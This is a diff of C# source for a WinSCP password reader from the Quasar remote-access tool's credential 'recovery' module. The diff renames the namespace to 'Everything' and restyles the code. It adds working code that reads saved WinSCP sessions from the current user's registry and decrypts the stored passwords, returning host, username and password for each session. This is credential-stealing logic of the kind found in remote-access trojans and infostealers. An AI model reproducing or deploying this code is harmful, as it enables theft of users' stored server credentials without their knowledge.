@@ -1,12 +1,13 @@
-﻿using Microsoft.Win32;
-using Quasar.Client.Extensions;
-using Quasar.Client.Helper;
+﻿using Everything.Extensions;
+using Everything.Helper;
+using Everything.Recovery;
+using Microsoft.Win32;
 using Quasar.Common.Models;
 using System;
 using System.Collections.Generic;
 using System.Linq;
 
-namespace Quasar.Client.Recovery.FtpClients
+namespace Everything.Recovery.FtpClients
 {
     public class WinScpPassReader : IAccountReader
     {
@@ -16,24 +17,26 @@ namespace Quasar.Client.Recovery.FtpClients
         /// <inheritdoc />
         public IEnumerable<RecoveredAccount> ReadAccounts()
         {
-            List<RecoveredAccount> data = new List<RecoveredAccount>();
+            var data = new List<RecoveredAccount>();
             try
             {
-                string regPath = @"SOFTWARE\\Martin Prikryl\\WinSCP 2\\Sessions";
+                var regPath = @"SOFTWARE\\Martin Prikryl\\WinSCP 2\\Sessions";
 
-                using (RegistryKey key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.CurrentUser, regPath))
+                using (var key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.CurrentUser, regPath))
                 {
-                    foreach (String subkeyName in key.GetSubKeyNames())
+                    foreach (var subkeyName in key.GetSubKeyNames())
                     {
-                        using (RegistryKey accountKey = key.OpenReadonlySubKeySafe(subkeyName))
+                        using (var accountKey = key.OpenReadonlySubKeySafe(subkeyName))
                         {
-                            if (accountKey == null) continue;
-                            string host = accountKey.GetValueSafe("HostName");
-                            if (string.IsNullOrEmpty(host)) continue;
+                            if (accountKey == null)
+                                continue;
+                            var host = accountKey.GetValueSafe("HostName");
+                            if (string.IsNullOrEmpty(host))
+                                continue;
 
-                            string user = accountKey.GetValueSafe("UserName");
-                            string password = WinSCPDecrypt(user, accountKey.GetValueSafe("Password"), host);
-                            string privateKeyFile = accountKey.GetValueSafe("PublicKeyFile");
+                            var user = accountKey.GetValueSafe("UserName");
+                            var password = WinSCPDecrypt(user, accountKey.GetValueSafe("Password"), host);
+                            var privateKeyFile = accountKey.GetValueSafe("PublicKeyFile");
                             host += ":" + accountKey.GetValueSafe("PortNumber", "22");
 
                             if (string.IsNullOrEmpty(password) && !string.IsNullOrEmpty(privateKeyFile))
@@ -59,9 +62,9 @@ namespace Quasar.Client.Recovery.FtpClients
 
         private int dec_next_char(List<string> list)
         {
-            int a = int.Parse(list[0]);
-            int b = int.Parse(list[1]);
-            int f = (255 ^ (((a << 4) + b) ^ 0xA3) & 0xff);
+            var a = int.Parse(list[0]);
+            var b = int.Parse(list[1]);
+            var f = 255 ^ ((a << 4) + b ^ 0xA3) & 0xff;
             return f;
         }
 
@@ -70,13 +73,11 @@ namespace Quasar.Client.Recovery.FtpClients
             try
             {
                 if (user == string.Empty || pass == string.Empty || host == string.Empty)
-                {
                     return "";
-                }
-                string qq = pass;
-                List<string> hashList = qq.Select(keyf => keyf.ToString()).ToList();
-                List<string> newHashList = new List<string>();
-                for (int i = 0; i < hashList.Count; i++)
+                var qq = pass;
+                var hashList = qq.Select(keyf => keyf.ToString()).ToList();
+                var newHashList = new List<string>();
+                for (var i = 0; i < hashList.Count; i++)
                 {
                     if (hashList[i] == "A")
                         newHashList.Add("10");
@@ -93,8 +94,8 @@ namespace Quasar.Client.Recovery.FtpClients
                     if ("ABCDEF".IndexOf(hashList[i]) == -1)
                         newHashList.Add(hashList[i]);
                 }
-                List<string> newHashList2 = newHashList;
-                int length = 0;
+                var newHashList2 = newHashList;
+                var length = 0;
                 if (dec_next_char(newHashList2) == 255)
                     length = dec_next_char(newHashList2);
                 newHashList2.Remove(newHashList2[0]);
@@ -102,24 +103,24 @@ namespace Quasar.Client.Recovery.FtpClients
                 newHashList2.Remove(newHashList2[0]);
                 newHashList2.Remove(newHashList2[0]);
                 length = dec_next_char(newHashList2);
-                List<string> newHashList3 = newHashList2;
+                var newHashList3 = newHashList2;
                 newHashList3.Remove(newHashList3[0]);
                 newHashList3.Remove(newHashList3[0]);
-                int todel = dec_next_char(newHashList2) * 2;
-                for (int i = 0; i < todel; i++)
+                var todel = dec_next_char(newHashList2) * 2;
+                for (var i = 0; i < todel; i++)
                 {
                     newHashList2.Remove(newHashList2[0]);
                 }
-                string password = "";
-                for (int i = -1; i < length; i++)
+                var password = "";
+                for (var i = -1; i < length; i++)
                 {
-                    string data = ((char)dec_next_char(newHashList2)).ToString();
+                    var data = ((char)dec_next_char(newHashList2)).ToString();
                     newHashList2.Remove(newHashList2[0]);
                     newHashList2.Remove(newHashList2[0]);
                     password = password + data;
                 }
-                string splitdata = user + host;
-                int sp = password.IndexOf(splitdata, StringComparison.Ordinal);
+                var splitdata = user + host;
+                var sp = password.IndexOf(splitdata, StringComparison.Ordinal);
                 password = password.Remove(0, sp);
                 password = password.Replace(splitdata, "");
                 return password;
